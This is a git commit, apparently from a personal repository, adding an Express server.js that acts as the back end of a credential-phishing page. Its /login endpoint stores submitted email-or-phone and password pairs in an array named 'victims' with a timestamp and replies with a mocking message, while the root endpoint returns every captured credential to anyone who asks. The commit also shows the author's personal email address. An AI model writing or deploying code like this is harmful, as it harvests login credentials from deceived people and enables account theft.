83a6a70cc88067ffdc064956a0a57b5a3b1622bb
nabil-github0 <nabilahmed.2977.2019@gmail.com>
2022-08-14 19:25:30 -0700

    First intitialization

---
+++ server.js
@@ -0,0 +1,27 @@
+const express = require("express");
+var cors = require('cors')
+
+const app = express();
+app.use(express.json());
+app.use(cors())
+
+const database = {victims:[]};
+
+app.get("/", (req, res) => {
+    res.send(database)
+})
+
+app.post("/login", (req,res) => {
+    const {emailOrphone, password} = req.body;
+    database.victims.push({
+        emailOrphone:emailOrphone, 
+        password:password,
+        time: new Date().toLocaleString([], { timeZone: "Asia/Dhaka" })
+    })
+    res.json("Congratulation...hehe...lol");
+})
+
+app.listen(4000, () => {
+    console.log("app is listening to port 4000")
+})
+
